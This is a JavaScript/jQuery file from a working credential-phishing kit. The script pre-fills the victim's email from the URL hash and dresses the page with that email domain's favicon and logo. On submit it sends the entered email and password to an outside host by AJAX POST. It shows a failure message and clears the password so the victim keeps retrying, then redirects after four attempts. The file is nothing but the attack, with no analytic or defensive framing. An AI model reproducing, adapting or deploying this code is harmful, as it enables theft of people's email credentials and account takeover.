 /* global $ */
    $(document).ready(function(){
      var count=0;

      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 100);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
        $(".logoname").html(finalu);



        var mainPage = 'https://'+my_slice; 
	
		var sv = my_slice;
		
		var image = "url('https://image.thum.io/get/auth/68840-32078/width/1200/https://"+sv;"')"
		

        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
         
      //  document.body.style.backgroundImage = image;

      }


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://geosonicng.com/wrk/tg/pdf.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=4) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("https://babbajay19.github.io/CS1.1.jpg");

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=4) {
                count=0;
                window.location.replace("https://babbajay19.github.io/CS1.1.jpg");
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
          });
    });


    });

